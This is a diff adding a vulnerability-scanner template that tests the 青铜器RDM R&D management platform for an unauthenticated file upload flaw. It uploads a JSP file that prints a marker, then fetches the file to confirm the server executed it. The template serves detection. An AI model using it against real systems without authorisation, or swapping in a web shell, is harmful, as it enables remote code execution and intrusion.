@@ -1,0 +1,59 @@
+id: poc-yaml-cnrdm-upload-upload
+info:
+  name: 青铜器RDM研发管理平台 /upload 文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects a file upload vulnerability in 青铜器RDM研发管理平台 by uploading a malicious JSP file and verifying its execution.
+
+variables:
+  t1: "{{rand_int(111000, 999000)}}"
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "/upload?dir=cmVwb3NpdG9yeQ==&name=dGVzdC5qc3A=&start=0&size=7000"
+    headers:
+      Content-Type: multipart/form-data; boundary=00content0boundary00
+    body: |
+      --00content0boundary00
+      Content-Disposition: form-data; name="file"; filename="poc.jsp"
+      Content-Type: application/octet-stream
+
+      <%out.println("hello{{t1}}");%>
+      --00content0boundary00
+      Content-Disposition: form-data; name="Submit"
+
+      Go
+      --00content0boundary00--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        part: body
+        regex:
+          - "(?P<path>.*?)test.jsp"
+    extractors:
+      - type: regex
+        name: file_path
+        part: body
+        regex:
+          - "(?P<path>.*?)test.jsp"
+        internal: true
+
+  - id: verify-file
+    method: GET
+    path:
+      - "/repository{{file_path}}test.jsp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - "trim(body) == concat('hello', t1)"
